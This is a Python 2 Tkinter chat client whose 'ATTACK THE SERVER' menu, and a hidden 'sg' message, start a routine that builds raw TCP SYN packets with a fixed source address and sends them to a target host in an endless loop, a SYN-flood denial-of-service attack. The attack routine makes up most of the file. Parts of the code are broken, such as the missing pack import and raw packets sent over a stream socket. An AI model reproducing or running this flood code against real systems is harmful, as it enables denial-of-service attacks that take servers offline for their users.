import socket
from Tkinter import *
import sys  #for exit
import tkMessageBox
from syn import *


def attack(sock,host1,port1):
    print "SG"
    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
            s = s + w
         
        s = (s>>16) + (s & 0xffff);
        s = ~s & 0xffff
         
        return s
     
    packet = '';
     
    source_ip = '192.168.1.4'
    dest_ip = '192.168.1.2' 
     
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   
    id = 54321  
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  
    saddr = socket.inet_aton ( source_ip )  
    daddr = socket.inet_aton ( dest_ip )
     
    ihl_version = (version << 4) + ihl
     

    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
     
    source = 1234   
    dest = 80   
    seq = 0
    ack_seq = 0
    doff = 5    

    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons (5840)    
    check = 0
    urg_ptr = 0
     
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
     
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
     
    source_address = socket.inet_aton( source_ip )
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
     
    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;
     
    tcp_checksum = checksum(psh)
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
     
    packet = ip_header + tcp_header
     
    aa=1
    print str(port1)
    print str(host1)
    while aa==1:
        msg1 = "attack"
        sock.sendto(msg1,(host1,port1))
        sock.sendto(packet, (dest_ip , 0 ))    


blue ="#000fff000"
print "Hello"
try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error,msg:
   print "Socket Creation Error"
   sys.exit();
print "Socket Created"

host = '192.168.1.3'
port = 9040

root = Tk()
frame = Frame(root)
frame.pack()
root.geometry("500x500")
e=NONE


try:
    ip = socket.gethostbyname(host)
except:
    print "Hostname could not be resolved"
    sys.exit()

print 'Ip address :' + ip

s.connect((host, port))
print 'Socket Connected to ' + host + ' on ip ' + ip


def sendmsg():
 global e
 e = Entry(frame ,width=50 )
 e.pack(side=RIGHT)
 e.focus_set()
 b = Button(frame, text="send", width=10, command=callback ,bg =blue)
 b.pack(side=LEFT)
 mainloop()    


def attack2():
   B2 = Button(root, text = "ATTACK THE SERVER", command = attack3)
   B2.pack(side =TOP)
   
   
def attack3():
   attack(s,host,port)
   

def callback():
    while(1):
      
      print e.get()
      msg=str(e.get())
      if msg=="sg":
         attack(s,host,port)
      e.delete(0, END)
         
      try :
        text_area.insert(END,'Client:'+msg+'\n')
        s.sendto(msg, (host, port))
        
        d = s.recvfrom(1024)
        reply = d[0]
        addr = d[1]
         
        print 'Server reply : ' + reply
        text_area.insert(END,'Server:'+reply+'\n')
        s.blocking(0)
        

     
      except socket.error, msg:
        print 'Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()




menubar = Menu(root)
filemenu = Menu(menubar, tearoff=0)
filemenu.add_command(label="SEND A MESSAGE", command=sendmsg)
filemenu.add_separator()



filemenu.add_command(label="Exit", command=sys.exit)
menubar.add_cascade(label="SEND", menu=filemenu)
root.config(menu=menubar)

attackmenu = Menu(menubar, tearoff=0)
attackmenu.add_command(label="ATTACK THE SERVER", command=attack2)
attackmenu.add_separator()

menubar.add_cascade(label="ATTACK", menu=attackmenu)
root.config(menu=menubar)


frame=Frame(root)
frame.pack()
text_area = Text(frame)
text_area.pack(side=BOTTOM)



B1 = Button(root, text = "CLOSE", command = sys.exit)
B1.pack(side =TOP)

root.mainloop()
s.close();
